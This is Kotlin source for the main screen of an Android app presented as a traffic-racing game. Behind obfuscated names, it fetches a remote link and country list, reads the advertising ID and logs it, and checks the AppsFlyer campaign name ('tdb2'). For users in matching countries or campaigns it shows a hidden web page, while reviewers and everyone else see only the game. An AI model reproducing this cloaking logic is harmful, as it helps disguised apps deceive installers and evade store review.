package com.skgames.trafficridert

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.viewModels
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.skgames.trafficridert.AppClass.Companion.appsChecker
import com.skgames.trafficridert.AppClass.Companion.eus
import com.skgames.trafficridert.AppClass.Companion.weopslsamkx
import com.skgames.trafficridert.databinding.ActivityMainBinding
import com.skgames.trafficridert.game.Game
import com.skgames.trafficridert.utils.StateConnetion
import com.skgames.trafficridert.viewmodel.OnyxViewModel
import com.skgames.trafficridert.web.Web
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    var countrycode = ""
    var geo = ""
    lateinit var pdolc: ActivityMainBinding

    private val onyxViewModel : OnyxViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        pdolc = ActivityMainBinding.inflate(layoutInflater)
        setContentView(pdolc.root)
        networkJob()
        lifecycleScope.launch {
            AppsFlyerLib.getInstance()
                .init("kxAbcrSfYiK4GSF2zEgYMQ", eusuixj, applicationContext)
            AppsFlyerLib.getInstance().start(this@MainActivity)
        }


    }



    private fun lobpocvookd(){
        val eusi = AdvertisingIdClient(applicationContext)
        eusi.start()
        val clozxck = eusi.info.id
        Log.d("getAdvertisingId = ", clozxck.toString())
        Hawk.put(eus, clozxck)
    }


    private fun networkJob(){

       onyxViewModel.getData().observe(this@MainActivity){
           when(it){
              is StateConnetion.Loading ->{

              }

               is  StateConnetion.Success ->{
                   countrycode = it.data.body()?.coountryCode.toString()
                   onyxViewModel.getDataDev().observe(this@MainActivity){
                       when(it){
                           is StateConnetion.Loading->{

                           }
                           is StateConnetion.Success ->{
                               val linkus = it.data.body()?.view
                               val appscheking = it.data.body()?.appsChecker
                               geo = it.data.body()?.geo.toString()
                               Hawk.put(AppClass.link,linkus)
                               Hawk.put(appsChecker,appscheking)
                               checker()

                           }

                           is StateConnetion.Failed->{
                               startActivity(Intent(this@MainActivity,Game::class.java))
                               finish()
                           }

                       }
                   }
               }

               is StateConnetion.Failed -> {
                   startActivity(Intent(this@MainActivity,Game::class.java))
                   finish()

               }

           }
       }

    }

    private val eusuixj = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(fidosood: MutableMap<String, Any>?) {
            val boppdf = fidosood?.get("campaign").toString()
            Hawk.put(weopslsamkx, boppdf)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
    private fun checker(){
        lifecycleScope.launch(Dispatchers.IO) {
            val xlcopc = Hawk.get(appsChecker, "null")
            var rodop: String? = Hawk.get(weopslsamkx)
            lobpocvookd()
            if (xlcopc == "1") {
                val fidofko = Executors.newSingleThreadScheduledExecutor()
                fidofko.scheduleAtFixedRate({
                    if (rodop != null) {
                        Log.d("TestInUIHawk", rodop.toString())
                        if (rodop!!.contains("tdb2") || geo.contains(countrycode)) {
                            Log.d("Apps Checker", "naming: $rodop")
                            fidofko.shutdown()
                            startActivity(Intent(this@MainActivity, Web::class.java))
                            finish()
                        } else {
                            fidofko.shutdown()
                            startActivity(Intent(this@MainActivity, Game::class.java))
                            finish()
                        }
                    } else {
                        rodop = Hawk.get(weopslsamkx)
                        Log.d("TestInUIHawk", "Received null $rodop")
                    }

                }, 0, 2, TimeUnit.SECONDS)
            } else if (geo.contains(countrycode)) {
                startActivity(Intent(this@MainActivity, Web::class.java))
                finish()
            } else {
                startActivity(Intent(this@MainActivity, Game::class.java))
                finish()
            }
        }
    }
}